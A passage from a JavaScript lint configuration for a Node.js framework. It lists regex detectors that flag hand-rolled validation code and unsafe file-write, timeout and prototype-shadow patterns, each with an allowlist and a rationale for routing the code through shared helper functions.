    reason: "Extracted across guard-csv / guard-html / guard-svg gate(opts) factories. Every guard's gate() body forwarded the same ~16-key opts bag (mode / audit / observability / forensicEvidenceStore / cache / hooks / runtime cap / ...) to gateContract.defineGate; centralized so each guard's gate() body is just the check function plus a label. guard-all.js is allowlisted on a different axis: _resolveActiveGuards assembles this same opts bag as the BASE that is then merged with per-guard overrides and fanned out to every member guard's already-built gate — it is the aggregate dispatcher's base-opts, not a single guard's gate forwarder, so buildGuardGate (which builds one gate) does not apply.",
  },
  {
    id: "inline-bad-input-issue-result",
    primitive: "gateContract.badInputResultIfNotStringOrBuffer(input)",
    regex: /typeof\s+input\s*!==\s*["']string["']\s*&&\s*!Buffer\.isBuffer\(input\)\s*\)\s*\{\s*return\s*\{\s*ok:\s*false,\s*issues:\s*\[\s*\{\s*kind:\s*["']bad-input["']/,
    allowlist: ["lib/gate-contract.js"],
    reason: "Extracted across guard-svg / guard-filename validate paths that need raw-Buffer input pre-conversion (svg for SVGZ magic, filename for overlong-UTF-8 byte scan). The bad-input fallback `{ ok: false, issues: [{ kind: bad-input, ... }] }` return shape was identical. Sanitize throw paths (different control-flow) are distinct and stay inline.",
  },
  {
    id: "inline-aggregate-issues",
    primitive: "gateContract.aggregateIssues(issues)",
    regex: /return\s*\{\s*ok:\s*!issues\.some\(function\s*\(i\)\s*\{\s*return\s+i\.severity\s*===\s*["']critical["']\s*\|\|\s*i\.severity\s*===\s*["']high["']/,
    allowlist: ["lib/gate-contract.js"],
    reason: "Extracted across guard-* validate paths that build the { ok, issues } result. The 5-line ok-aggregation tail (no critical/high → ok=true) was identical across guards; consolidated.",
  },
  {
    id: "inline-issue-validator-entry",
    primitive: "gateContract.runIssueValidator(input, opts, detector)",
    regex: /typeof\s+input\s*===\s*["']string["'](?:(?!\n\})[\s\S]){0,400}?Buffer\.isBuffer\(input\)(?:(?!\n\})[\s\S]){0,600}?bad-input(?:(?!\n\})[\s\S]){0,800}?return\s*\{(?:(?!\n\})[\s\S]){0,400}?ok:\s*!issues\.some/,
    allowlist: ["lib/gate-contract.js"],
    reason: "Extracted across guard-csv / guard-html validate() entry points. The string|Buffer normalization + bad-input fallback + issue-aggregation return shape was identical across guards; centralized into gate-contract. guard-svg keeps its inline form because SVGZ magic-byte detection needs the raw Buffer (utf8 conversion would lose the gzip header).",
  },
  {
    id: "inline-batch-positive-int-validation",
    primitive: "numericBounds.requireAllPositiveFiniteIntIfPresent(opts, names, labelPrefix, ErrorClass, code)",
    regex: /numericBounds\.requirePositiveFiniteIntIfPresent\([\s\S]{0,300}?numericBounds\.requirePositiveFiniteIntIfPresent\([\s\S]{0,300}?numericBounds\.requirePositiveFiniteIntIfPresent\(/,
    allowlist: ["lib/numeric-bounds.js"],
    reason: "Extracted across guard-csv / guard-html / guard-svg validate-entry numeric-opt cascades. Three or more consecutive `numericBounds.requirePositiveFiniteIntIfPresent(opts.X, ...)` calls in a row is exactly the shape this batch helper consolidates. Other primitives with 1-2 cap-opts can keep the single-call form; the batch helper kicks in at the 3+ threshold.",
  },
  {
    id: "inline-assert-no-char-threats",
    primitive: "codepointClass.assertNoCharThreats(text, opts, errorFactory, codePrefix)",
    regex: /opts\.bidiPolicy\s*===\s*["']reject["'](?:(?!\n\})[\s\S]){0,800}?BIDI_RE\.test(?:(?!\n\})[\s\S]){0,800}?opts\.nullBytePolicy\s*===\s*["']reject["']/,
    allowlist: ["lib/codepoint-class.js"],
    reason: "Extracted across guard-html / guard-svg sanitize entry — every guard's reject-on-character-class threats opens with the same `if (opts.bidiPolicy === 'reject' && BIDI_RE.test(s)) throw; if (opts.nullBytePolicy === 'reject' && s.indexOf(NULL_BYTE) !== -1) throw; if (opts.controlPolicy === 'reject' && C0_CTRL_RE.test(s)) throw;` cascade. Centralized so the reject-policy contract is identical across the family. guard-csv keeps its own inline cell-level reject for opt-name vocabulary reasons (bidiCharPolicy etc.).",
  },
  {
    id: "inline-audit-shape-validation",
    primitive: "validateOpts.auditShape(audit, label, ErrorClass)",
    regex: /opts\.audit\s*!==\s*undefined\s*&&\s*opts\.audit\s*!==\s*null[\s\S]{0,200}?safeEmit\s*!==\s*["']function["']/,
    allowlist: [],
    reason: "Extracted across api-key / cache / notify / permissions / seeders / webhook (signer + verifier) / auth/lockout / middleware/db-role-for / external-db-migrate. The inline shape was identical 10x.",
  },
  {
    id: "inline-observability-shape-validation",
    primitive: "validateOpts.observabilityShape(observability, label, ErrorClass)",
    regex: /opts\.observability\s*!==\s*undefined\s*&&\s*opts\.observability\s*!==\s*null(?:(?!\n\s*\})[\s\S]){0,1500}?event\s*!==\s*["']function["']/,
    allowlist: [],
    reason: "Extracted parallel to auditShape — opts.observability shape validation across i18n / cache / auth.lockout.",
  },
  {
    id: "inline-optional-boolean-validation",
    primitive: "validateOpts.optionalBoolean(value, label, ErrorClass, code?)",
    regex: /opts\.\w+\s*!==\s*undefined\s*&&\s*typeof\s+opts\.\w+\s*!==\s*["']boolean["']/,
    allowlist: [
      "lib/validate-opts.js",
      // http-client.js's configurePool throws raw Error, not a
      // framework-error class. Surfaced earlier in the session as a
      // harmonization candidate. Allowlist until a framework-error
      // class is wired into http-client.
      "lib/http-client.js",
    ],
    reason: "Extracted across api-key / cache / notify / permissions / seeders / webhook / db-role-for. Centralized boolean type-check.",
  },
  {
    id: "inline-optional-function-validation",
    primitive: "validateOpts.optionalFunction(value, label, ErrorClass, code?)",
    regex: /opts\.\w+\s*!==\s*undefined\s*&&\s*typeof\s+opts\.\w+\s*!==\s*["']function["']/,
    allowlist: [
      "lib/validate-opts.js",
      // http-client.js uses bare `throw new Error(...)` for several opts —
      // doesn't fit the framework-error class signature optionalFunction
      // requires. Tracked in the cross-module follow-ups list.
      "lib/http-client.js",
      // i18n.js's onMissingKey / notify.js's redact include extra
      // signature context in the message ("(key, locale)" /
      // "returning a redacted message") — not a clean shape match.
      "lib/i18n.js",
      "lib/notify.js",
      // retry.js uses raw TypeError, not framework-error.
      "lib/retry.js",
    ],
    reason: "Extracted across api-key / cache / seeders / webhook / db-role-for / permissions / auth/lockout. Centralized function type-check.",
  },
  {
    id: "inline-optional-positive-int-validation",
    primitive: "validateOpts.optionalPositiveInt(value, label, ErrorClass, code?)",
    regex: /opts\.\w+\s*!==\s*undefined\s*&&\s*!_isPositiveInt\s*\(\s*opts\.\w+\s*\)/,
    allowlist: ["lib/validate-opts.js"],
    reason: "Extracted across api-key / others. Routes through numericChecks.isPositiveInt; the helper bakes in the throw semantics.",
  },
  {
    id: "inline-optional-positive-finite-validation",
    primitive: "validateOpts.optionalPositiveFinite(value, label, ErrorClass, code?)",
    // Match the literal shape `if (X !== undefined && (typeof X !== "number"
    // || !isFinite(X) || X <= 0))` — the strict positive-finite gate that
    // the optionalPositiveFinite helper bakes in.
    regex: /opts\.\w+\s*!==\s*undefined\s*&&\s*\(\s*typeof\s+opts\.\w+\s*!==\s*["']number["']\s*\|\|\s*!isFinite\s*\(\s*opts\.\w+\s*\)\s*\|\|\s*opts\.\w+\s*<=\s*0\s*\)/,
    allowlist: ["lib/validate-opts.js"],
    reason: "Centralizes the > 0 finite-number check. Every primitive that gates on a positive finite numeric (e.g. mfaWindowMs, ttlMs minimums) routes through here.",
  },
  {
    id: "inline-optional-non-empty-string-validation",
    primitive: "validateOpts.optionalNonEmptyString(value, label, ErrorClass, code?)",
    // Match the OPTIONAL shape only — `X !== undefined && (typeof X !==
    // "string" || X.length === 0)`. The required form (no undefined
    // guard) is a separate primitive (requireNonEmptyString) below.
    regex: /opts\.\w+\s*!==\s*undefined\s*&&\s*\(?\s*typeof\s+opts\.\w+\s*!==\s*["']string["']\s*\|\|\s*opts\.\w+\.length\s*===\s*0/,
    allowlist: ["lib/validate-opts.js"],
    reason: "Centralizes the optional non-empty-string gate for fields that may be omitted but must be a non-empty string when present.",
  },
  {
    id: "inline-require-methods-validation",
    primitive: "validateOpts.requireMethods(obj, methods, label, ErrorClass, code) — validate an injected dependency object exposes a FIXED set of named methods. Hand-rolling `var required = [\"a\", \"b\", ...]; for (var i ...) { if (typeof obj[required[i]] !== \"function\") throw new <Err>(<code>, ...) }` re-spells it; pass the method list as the `methods` argument.",
    // Anchors on a LITERAL string-array method-list var immediately followed
    // (same var, backref \1) by the per-element `typeof obj[arr[i]] !==
    // "function"` check — the fixed-required-methods hand-roll. The DYNAMIC
    // form (`var names = Object.keys(obj); ... typeof obj[names[i]] !==
    // "function"` — "every provided field is a function", e.g.
    // require-bound-key's getBoundField check) has no literal array, so it does
    // NOT match and is correctly left alone (it is not requireMethods). The
    // primitive itself takes `methods` as a parameter (no literal-array decl),
    // so validate-opts.js never trips — EMPTY allowlist.
    regex: /var\s+(\w+)\s*=\s*\[\s*"[\w$]+"[\s\S]{0,300}?typeof\s+\w+\[\s*\1\s*\[\s*\w+\s*\]\s*\]\s*!==\s*"function"/,
    skipCommentLines: true,
    allowlist: [],
    reason: "backup._validateStorage, restore._validateStorage, and cache._validateBackendObject each hand-rolled the same fixed-required-methods check that validateOpts.requireMethods already owns — declare a literal array of method names, throw if the dependency is not an object, then loop throwing if any named method is not a function (the b.dsr / b.outbox create() backends already route through requireMethods). The fp:621d906770d0 STRONG-DUP surfaced only the backup/restore pair (read-only restore needs { readBundle, listBundles, hasBundle }; write-capable backup needs those + writeBundle + deleteBundle — the method set is the natural `methods` argument); the §1 root sweep found cache's six-method backend check too (a coincidental member, require-bound-key's create, uses a DYNAMIC Object.keys()-driven all-functions check — a different operation, not folded in). All three now call validateOpts.requireMethods(obj, methods, label, ErrorClass, code), preserving each error class + code (BackupError backup/bad-storage, RestoreError restore/bad-storage, CacheError BAD_OPT — the existing tests assert the code / that it throws, and stay green); the message becomes requireMethods' canonical form (which additionally lists the required method set). Allowlist is EMPTY — requireMethods takes `methods` as a parameter, so it has no literal-array declaration and never trips; a re-introduced fixed-method-list hand-roll does. The dynamic Object.keys() all-functions form is deliberately not matched (no literal array).",
  },
  {
    id: "inline-require-methods-chain-validation",
    primitive: "validateOpts.requireMethods(obj, methods, label, ErrorClass, code, permanent?)",
    // The ||-CHAIN spelling of the injected-dependency contract check —
    // `if (!X || typeof X.a !== "function" || typeof X.b !== "function") {
    // throw <typed> }` — the inline form the sibling
    // inline-require-methods-validation detector (literal method-name array)
    // does NOT catch. Anchors 2+ `typeof <obj>.<method> !== "function"` on the
    // SAME object (backref \1) joined by ||, closing into a `) { throw`. The
    // RETURN-form defensive readers (csp-nonce / request-helpers skip header
    // patching with `return next()` / `return;`) end in `return`, not `throw`,
    // so they do NOT match — those are §8 request-shape readers, not config-time
    // dependency validators, and stay inline. The {0,200} bound is a pure ReDoS
    // backstop; the `) { throw` structural anchor is the precision mechanism.
    scanScope: "lib",
    skipCommentLines: true,
    regex: /typeof\s+(\w+)\.\w+\s*!==\s*"function"\s*\|\|[^}]{0,200}?typeof\s+\1\.\w+\s*!==\s*"function"[^}]*?\)\s*\{\s*throw\b/,
    allowlist: [
      // Home — requireMethods loops over indexed obj[methods[i]] (never the
      // `obj.literalName` dot form), so the primitive itself never trips; listed
      // for safety.
      "lib/validate-opts.js",
      // §8 RUNTIME fail-closed reader — middleware.sse validates the per-request
      // `res` shape INSIDE the handler and throws an untyped Error to fail closed
      // mid-request. That is the defensive request-shape tier, not a config-time
      // injected-dependency check; requireMethods is the config-time (operator-
      // misconfig) primitive. Different validation tier — stays inline.
      "lib/middleware/sse.js",
      // The seal/unseal vault check carries operator-critical remediation in its
      // message ("use caKeySealedMode='disabled' to keep the CA key on disk in
      // plaintext") that requireMethods' canonical message cannot express — the
      // same operator-meaningful-context exception the inline-require-non-empty-
      // string-validation detector makes for backup/bundle / cache / nel.
      "lib/mtls-ca.js",
    ],
    reason: "The injected-dependency contract guard (an operator-supplied store / backend / vault / db / query / readable must expose a fixed set of methods) written as a `typeof X.a !== \"function\" || typeof X.b !== \"function\"` ||-chain that closes into a typed throw — the inline spelling the literal-array sibling detector misses. validateOpts.requireMethods(obj, methods, label, ErrorClass, code, permanent?) owns it: it throws on null / non-object / any missing-or-non-function method and (since the permanent param) forwards the framework error's non-retryable flag, so callers whose config error is permanent (session.useStore, pubsub custom backend, problem-details.respond, middleware.idempotencyKey) keep it. Routed: agent-idempotency/orchestrator/saga/tenant, ai-quota, archive-adapters, auth-bot-challenge, bounded-map, cache, cert, cookies, dsr, gate-contract, http-client-cookie-jar, middleware/idempotency-key, middleware/tus-upload, pagination (cursor + offset), problem-details, pubsub, session-device-binding, session, sse — each preserving its error class + code (+ permanent where set); the message becomes requireMethods' canonical form. Allowlist: validate-opts.js (home, uses indexed obj[methods[i]]); middleware/sse.js (§8 runtime res-shape reader, untyped fail-closed throw, not a config-time dependency check); mtls-ca.js (its message carries operator-critical seal-disable remediation requireMethods cannot express). The RETURN-form defensive readers (csp-nonce, request-helpers) end in `return`, not `throw`, so they are not matched.",
  },
  {
    id: "inline-require-non-empty-string-validation",
    primitive: "validateOpts.requireNonEmptyString(value, label, ErrorClass, code?)",
    // Match the REQUIRED shape — `if (typeof X !== "string" ||
    // X.length === 0) throw` at the top of a validation block. The
    // regex also matches inner if-blocks nested inside outer `X !==
    // undefined &&` guards (compound-optional shape) — those sites are
    // allowlisted below because the helper doesn't compose with the
    // adjacent _validateIdent / format check.
    regex: /\bif\s*\(\s*typeof\s+opts\.\w+\s*!==\s*["']string["']\s*\|\|\s*opts\.\w+\.length\s*===\s*0\s*\)/,
    allowlist: [
      "lib/validate-opts.js",
      // safe-buffer.js — makeByteCoercer's `opts.typeCode` check. Its
      // SafeBufferError constructor is message-FIRST (message, code);
      // validateOpts.requireNonEmptyString builds the error code-first
      // (`new errorClass(code, msg)` in validate-opts._throw), so routing
      // through it would emit a SafeBufferError with code and message
      // SWAPPED (the documented errorFactory/message-order hazard that
      // toBuffer's errorFactory opt exists to avoid). Keep the inline
      // throw so the message/code land correctly.
      "lib/safe-buffer.js",
      // Compound validators — type-check + _validateIdent / format
      // check / URL example combined. Splitting the type check out
      // would scatter validation across two helpers and lose
      // operator-readable error messages.
      "lib/backup/bundle.js",                    // line 92 — operator-meaningful "(use vault.getKeysJson() ...)" hint
      "lib/cache.js",                            // line 192 — backend === "redis" precondition + URL example
      "lib/cli-helpers.js",                      // raw Error (no framework class)
      "lib/db-declare-row-policy.js",            // optional + _validateIdent compound
      "lib/db-declare-view.js",                  // optional + _validateIdent compound
      "lib/middleware/csp-nonce.js",             // optional-with-default + operator hint
      "lib/middleware/db-role-for.js",           // optional + _validateRoleIdentifier compound
      "lib/middleware/nel.js",                   // operator-readable "collectorUrl is required" prose tested by /collectorUrl is required/ regex; validateOpts emits "validate-opts/missing-non-empty-string" instead
      "lib/protocol-dispatcher.js",              // optional fallbackProtocol guard
      "lib/pubsub-redis.js",                     // raw Error (no framework class)
      "lib/restore-rollback.js",                 // compound: derives rollbackRoot from opts.dataDir
      // permanent: true 3rd-arg sites — helper signature doesn't
      // expose the permanent flag. Refactoring would silently drop it.
      "lib/migrations.js",
      "lib/queue-redis.js",
      "lib/queue-sqs.js",
    ],
    reason: "Required non-empty-string fields. Most primitives' create() functions start with this shape for opts.namespace / opts.dir / opts.url / opts.region / etc. Centralizes the throw + message format. 13 sites allowlisted with documented per-site reasons (compound validators, raw Error, permanent-arg, operator-meaningful extra context).",
  },
  {
    id: "inline-optional-finite-non-negative-validation",
    primitive: "validateOpts.optionalFiniteNonNegative(value, label, ErrorClass, code?)",
    // Match either `!_isFiniteNonNegative(opts.X)` or the full inline form
    // `typeof opts.X !== "number" || !isFinite(opts.X) || opts.X < 0`.
    regex: /opts\.\w+\s*!==\s*undefined\s*&&\s*\(\s*typeof\s+opts\.\w+\s*!==\s*["']number["']\s*\|\|\s*!isFinite\s*\(\s*opts\.\w+\s*\)\s*\|\|\s*opts\.\w+\s*<\s*0\s*\)/,
    allowlist: ["lib/validate-opts.js"],
    reason: "Extracted across primitives. Centralizes the non-negative-finite numeric check.",
  },
  {
    id: "inline-positive-finite-int-hand-rolled",
    primitive: "numericBounds.requirePositiveFiniteInt / requirePositiveFiniteIntIfPresent / requireAllPositiveFiniteIntIfPresent (or the isPositiveFiniteInt predicate for a custom throw)",
    // The positive-finite-int re-roll: the distinctive ">0 AND integer" tail
    // `X <= 0 ... Math.floor(X) !== X` (same var, backref \1; the [^;]{0,60}
    // window absorbs an interleaved range check like `|| X > 65535`). The
    // numericBounds helpers own this rule + the consistent shape() message;
    // the require* throwers carry { permanent, statusCode } via the errorOpts
    // arg (so a non-retryable config error / a 4xx request opt keeps its flag),
    // and isPositiveFiniteInt is the predicate for custom throwers (a TypeError
    // / Promise.reject that can't pass as a code-first errorClass). The {0,60}
    // is a ReDoS backstop; the backref + `<= 0`/`Math.floor` pair is the
    // precision anchor. numeric-bounds.js's own isPositiveFiniteInt uses
    // Number.isInteger + `value > 0` (not this shape), so the home never trips.
    scanScope: "lib",
    skipCommentLines: true,
    regex: /[\w.]+\s*<=\s*0\b[^;]{0,60}?Math\.floor\(\s*([\w.]+)\s*\)\s*!==\s*\1/,
    allowlist: ["lib/numeric-bounds.js"],
    reason: "The positive-finite-int validation rule (`> 0` AND integer AND finite) is owned by numeric-bounds: the require* throwers for code-first defineClass errors (now carrying { permanent, statusCode } via errorOpts), and the isPositiveFiniteInt predicate for callers that throw their own (TypeError / Promise.reject / message-first) error. The §1 root sweep routed 19 hand-rolled `X <= 0 || Math.floor(X) !== X` re-rolls (the dotted `opts.X` form needed the [\\w.] loosening): external-db configurePool (min/max/idleTimeoutMs) + replica weight + connectAs statementTimeoutMs, http-client configurePool (maxSockets/maxFreeSockets/keepAliveMsecs — also upgraded from an UNTYPED Error to HttpClientError) + downloadStream/uploadMultipartStream maxBytes, http-client-cache memoryStore maxBytes/maxEntries, db.init/db.stream/Query.stream streamLimit (db-query was UNTYPED Error → DbQueryError), crypto-field truncateBytes, safe-mime _intOpt, sse maxBufferedBytes, api-encrypt sessionMaxResponses (permanent + statusCode 500), body-parser maxFiles (permanent + 400), network-tls connectWithEch port (range max 65535), retention rule.batchSize, crypto.hashFilesParallel maxBytesPerFile (predicate, keeps its TypeError/Promise.reject). Allowlist is numeric-bounds.js (the home — isPositiveFiniteInt uses Number.isInteger + value > 0, not the `<= 0`/Math.floor shape, so it does not self-trip); a re-introduced inline positive-int re-roll does.",
  },
  {
    id: "fd-read-loop-hand-rolled",
    primitive: "b.atomicFile.fdSafeReadSync(filepath, opts) — TOCTOU-safe fd read",
    // The read-fully loop over an open fd — `while (read < size) { var n =
    // nodeFs.readSync(fd, buf, read, size - read, null); if (n === 0) break;
    // read += n; }` — is the duplicated atom fdSafeReadSync owns (open + fstat
    // bind every measurement to the fd's inode = the TOCTOU defense; the
    // symlink/inode/cap/hash guards + short-read policy + encoding layer on as
    // opts). The anchor is the readSync(fd, buf, read, <size> - read, null)
    // 5-arg signature. atomic-file._readSyncCore, network-tls._readPathFile,
    // vault-seal-pem._resealNow, backup/bundle.create all route through it (each
    // keeps its own typed errors via the errorFor(kind, detail) callback).
    scanScope: "lib",
    skipCommentLines: true,
    regex: /\breadSync\(\s*\w+\s*,\s*[\w.]+\s*,\s*read\s*,\s*[\w.]+\s*-\s*read\s*,\s*null\s*\)/,
    allowlist: ["lib/atomic-file.js"],
    reason: "A TOCTOU-safe synchronous file read (open fd → fstat → read-fully loop, binding size/content/integrity to the fd's inode against a swap, CWE-367) is owned by b.atomicFile.fdSafeReadSync — with optional guards (maxBytes cap, refuseSymlink + inodeCheck, expectedHash, encoding, allowShortRead) and a per-caller errorFor(kind, detail) so each domain keeps its typed error. The §1 sweep routed the four hand-rolled read-fully loops: atomic-file._readSyncCore (the home; now the wrapper that supplies AtomicFileError messages), network-tls._readPathFile (utf8 + slice-on-short-read + raw ENOENT), vault/seal-pem-file._resealNow (the strongest posture: refuseSymlink + inodeCheck + maxSourceBytes, SealPemFileError codes wrapped by its outer audit/onError catch), backup/bundle.create (BackupBundleError short-read with per-entry relativePath). Allowlist is lib/atomic-file.js (fdSafeReadSync's own loop is the single home); a re-introduced `readSync(fd, buf, read, size - read, null)` read-loop anywhere else trips this — call b.atomicFile.fdSafeReadSync instead.",
  },
  {
    id: "raw-fs-write-without-exclusive-nofollow",
    primitive: "b.atomicFile.writeSync / writeStream / writeExclSync — atomic, O_EXCL|O_NOFOLLOW write-replace",
    // The write-side sibling of fd-read-loop-hand-rolled. A bare
    // nodeFs.writeFileSync(path, ...) / nodeFs.createWriteStream(path) follows
    // a symlink an attacker pre-planted at `path` (CWE-59 arbitrary write) and
    // leaves a torn file at the canonical name on a crash. Every framework
    // write-replace goes through an atomic-file primitive that stages into a
    // CSPRNG temp opened O_EXCL|O_NOFOLLOW and renames: writeSync (buffer),
    // writeStream (streaming source), writeExclSync (staged write→verify→rename
    // for the vault seal/unseal/rotate round-trip).
    scanScope: "lib",
    skipCommentLines: true,
    regex: /\bnodeFs\.(?:writeFileSync|createWriteStream)\s*\(/,
    allowlist: [
      "lib/atomic-file.js",   // primitives' home: createWriteStream(null, { fd }) over an _openExclTemp fd (the fd already carries O_EXCL|O_NOFOLLOW)
      "lib/backup/index.js",  // fsAdapter.writeFile uses writeFileSync(..., { flag: "wx" }) — O_CREAT|O_EXCL refuses (EEXIST) a pre-planted file/symlink
      "lib/http-client.js",   // downloadStream: createWriteStream(tmpPath, { flags: O_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW }) — explicit exclusive no-follow create
    ],
    reason: "Symlink-follow / torn-write class (CWE-59 / CWE-377). A raw nodeFs.writeFileSync / nodeFs.createWriteStream to a destination path follows a symlink an attacker pre-planted there and can leave a half-written file on a crash. The §1 sweep routed every hand-rolled write through an atomic-file primitive: writeSync (buffer payloads — cookie-jar flush, archive/tar extract, backup payloads, p12 export, api-snapshot, sealed-pem marker), writeStream (object-store streaming put — staged into a no-follow exclusive temp + atomic rename, capped by maxBytes), and writeExclSync (the vault seal/unseal/rotate staged write that must re-read + verify the bytes before the rename — clears any stale entry then O_EXCL|O_NOFOLLOW creates so a re-planted symlink fails closed). The three allowlisted files are the genuinely-safe forms: atomic-file.js owns the primitives (its createWriteStream binds an _openExclTemp fd); backup/index.js writeFileSync passes { flag: 'wx' } (O_EXCL refuses a pre-planted target); http-client.js opens its download temp with explicit O_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW flags. Any new raw nodeFs.writeFileSync/createWriteStream elsewhere trips this — call the matching atomic-file primitive instead.",
  },
  {
    id: "raw-fs-append-open-without-nofollow",
    primitive: "b.atomicFile.openAppendNoFollowSync — O_WRONLY|O_APPEND|O_CREAT|O_NOFOLLOW append open",
    // The append-sink sibling of raw-fs-write-without-exclusive-nofollow. A
    // long-lived append target (an active log file kept open across appends and
    // reopened on rotation) can't use a one-shot atomic write, but a bare
    // nodeFs.openSync(path, "a") / appendFileSync(path, ...) still FOLLOWS a
    // symlink an attacker pre-planted at `path` (CWE-59) — redirecting the
    // append stream to a victim file. openAppendNoFollowSync adds O_NOFOLLOW so
    // the symlink is refused (ELOOP) atomically with the open, closing the
    // caller-pre-check-then-unlink race. The primitive itself opens with a
    // numeric flags variable (not the "a" string), so its own home does not
    // match and needs no allowlist.
    scanScope: "lib",
    skipCommentLines: true,
    regex: /\bnodeFs\.(?:openSync\s*\(\s*[^,]+,\s*"a"|appendFileSync\s*\(|appendFile\s*\()/,
    allowlist: [],
    reason: "Symlink-follow append class (CWE-59). A bare nodeFs.openSync(path, \"a\") or nodeFs.appendFileSync(path, ...) follows a symlink an attacker pre-planted at the append target and redirects the log/append stream to an attacker-chosen file; a caller's pre-check-then-unlink can't close the race because the sink's own open is what follows the link. The fix routes every long-lived append open through b.atomicFile.openAppendNoFollowSync (O_WRONLY|O_APPEND|O_CREAT|O_NOFOLLOW): the file is created/appended normally but a symlink at the final component fails the open closed with ELOOP. The v0.15.16 sweep converted log-stream-local.js (active log sink) and daemon.js (detached-process stdout/stderr log). Zero allowlist — the primitive opens with a numeric flags variable, so any new nodeFs.openSync(..., \"a\") / appendFileSync / appendFile in lib/ trips this; call b.atomicFile.openAppendNoFollowSync instead.",
  },
  {
    id: "httpclient-request-idle-timeout-without-wall-clock",
    primitive: "forward BOTH timeoutMs (overall wall-clock) and idleTimeoutMs to httpClient.request — never idle-only",
    // #355 class. httpClient distinguishes timeoutMs (overall wall-clock cap)
    // from idleTimeoutMs (zero-progress cap). A consumer that maps its single
    // configured timeout to idleTimeoutMs ONLY has no overall bound: a peer
    // trickling bytes within the idle window holds the request open forever
    // (slow-loris). Every httpClient request object that sets idleTimeoutMs must
    // also set timeoutMs on the line immediately before it. This detector flags
    // an `idleTimeoutMs:` property (identifier/member value) whose preceding line
    // is NOT a `timeoutMs:` line. The allowlist is the SERVER-side / pool idle
    // timeouts — inbound connection inactivity disconnect (RFC 5321 §4.5.3.2.7
    // for SMTP, IMAP/POP3/ManageSieve/submission/TLS) and the external-db
    // connection pool — a structurally different concept (a long-lived server
    // socket has no per-request wall-clock to cap), NOT an outbound httpClient
    // request.
    scanScope: "lib",
    skipCommentLines: true,
    regex: /\n[ \t]*(?!timeoutMs\b)[A-Za-z_$][\w$]*:[^\n]*\n[ \t]*idleTimeoutMs:[ \t]*[A-Za-z_$]/,
    allowlist: [
      "lib/mail-server-imap.js",        // inbound IMAP server socket idle disconnect
      "lib/mail-server-managesieve.js", // inbound ManageSieve server socket idle disconnect
      "lib/mail-server-mx.js",          // inbound SMTP/MX server socket idle (RFC 5321 §4.5.3.2.7)
      "lib/mail-server-pop3.js",        // inbound POP3 server socket idle disconnect
      "lib/mail-server-submission.js",  // inbound submission server socket idle disconnect
      "lib/mail-server-tls.js",         // inbound TLS server socket idle (re-armed post-handshake)
    ],
    reason: "Slow-trickle hold-open class (#355, CWE-400). httpClient.request takes timeoutMs (overall wall-clock cap) AND idleTimeoutMs (zero-progress cap) as DISTINCT bounds. A consumer wrapping httpClient that forwards only idleTimeoutMs leaves the request unbounded in wall-clock time: a peer that emits one byte just under the idle window keeps resetting the idle timer forever, holding the call open indefinitely. The v0.15.16 sweep set timeoutMs alongside idleTimeoutMs in every httpClient consumer (api-encrypt httpClient, the object-store shared request wrapper + azure/gcs bucket-ops, queue-sqs, the cloudwatch/otlp/webhook log sinks, the HIBP password breach check). The detector requires timeoutMs on the line immediately before every idleTimeoutMs property; the only allowlisted files are inbound SERVER socket idle timeouts and the external-db pool idle — a long-lived server connection's inactivity disconnect, not an outbound request needing a per-request wall-clock cap. A new httpClient consumer forwarding idle-only trips this — set timeoutMs too.",
  },
  {
    id: "allowlist-map-indexed-by-untrusted-key-without-hasown",
    primitive: "Object.prototype.hasOwnProperty.call(MAP, key) — proto-shadow-safe allowlist membership",
    // Prototype-pollution / proto-shadow class. An object-literal allowlist
    // (`var MAP = { a: 1 }`) inherits Object.prototype, so MAP["constructor"],
    // MAP["__proto__"], MAP["toString"], MAP["valueOf"], MAP["hasOwnProperty"]
    // are all TRUTHY (and !== undefined) even though never added. A membership
    // gate `if (!MAP[key])` (reject-if-absent) or `if (MAP[key] === undefined)`
    // is therefore BYPASSED by a proto-named key when `key` is attacker- or
    // caller-controlled, and `var v = MAP[key]` then hands back a Function /
    // prototype member. The framework's 312-use idiom is
    // `Object.prototype.hasOwnProperty.call(MAP, key)` (own-key only). This
    // detector forbids the bare negated-bracket and `=== undefined` membership
    // shapes against a SCREAMING_CASE allowlist; reject-if-PRESENT gates
    // (`if (DROP[tag]) drop`) are a DIFFERENT, fail-safe polarity and use the
    // positive `if (MAP[key])` form this regex does not match.
    scanScope: "lib",
    skipCommentLines: true,
    regex: /!\s*(?:[a-zA-Z_$][\w$]*\.)?[A-Z][A-Z0-9_]{2,}\[\s*[a-z]|[A-Z][A-Z0-9_]{2,}\[[a-z][\w.]*\]\s*===\s*undefined/,
    allowlist: [],
    reason: "Proto-shadow allowlist-bypass class (CWE-1321 prototype pollution / unsafe reflection). A reject-if-absent membership check on an object-literal allowlist — `if (!MAP[key])` or `if (MAP[key] === undefined)` — passes for any Object.prototype member name (constructor / __proto__ / toString / valueOf / hasOwnProperty) when `key` is attacker- or caller-supplied, bypassing the allowlist and (for value-lookup callers) handing a Function downstream. The v0.15.14 sweep converted every such gate across lib/ to the framework's canonical `Object.prototype.hasOwnProperty.call(MAP, key)` membership idiom (already 312 uses). Zero allowlist: a re-introduced `!SCREAMING_MAP[lowercaseKey]` or `SCREAMING_MAP[key] === undefined` membership gate anywhere in lib/ trips this — use hasOwnProperty.call instead. Reject-if-PRESENT gates (`if (DANGEROUS[scheme]) refuse`) are the opposite, fail-safe polarity and are written with the positive `if (MAP[key])` form, which this detector deliberately does not match (adding hasOwnProperty there would weaken them).",
  },
  {
    id: "inline-optional-non-empty-string-array-validation",
    primitive: "validateOpts.optionalNonEmptyStringArray(value, label, ErrorClass, code?)",
    // Match the four-line cascade `if (opts.X !== undefined) { if
    // (!Array.isArray(opts.X)) throw ... ; for (i...) if (typeof opts.X[i]
    // !== "string" || opts.X[i].length === 0) throw }` — recurring across
    // api-key (scopes), file-upload (allowedFileTypes), seeders (dependsOn),
    // i18n (rtlLanguages / eagerLocales), and others.
    regex: /!\s*Array\.isArray\s*\(\s*\w+\.\w+\s*\)(?:(?!\n\}|!\s*Array\.isArray)[\s\S]){0,3000}?typeof\s+\w+\.\w+\s*\[\s*\w+\s*\]\s*!==\s*["']string["']\s*\|\|\s*\w+\.\w+\s*\[\s*\w+\s*\]\.length\s*===\s*0/,
    allowlist: ["lib/validate-opts.js"],
    reason: "Extracted to validateOpts.optionalNonEmptyStringArray. Replaces the per-file `if (X !== undefined) { if (!Array.isArray) throw; for (i) if (typeof !== string || === '') throw }` cascade with one call.",
  },
  {
    id: "inline-optional-object-with-method-validation",
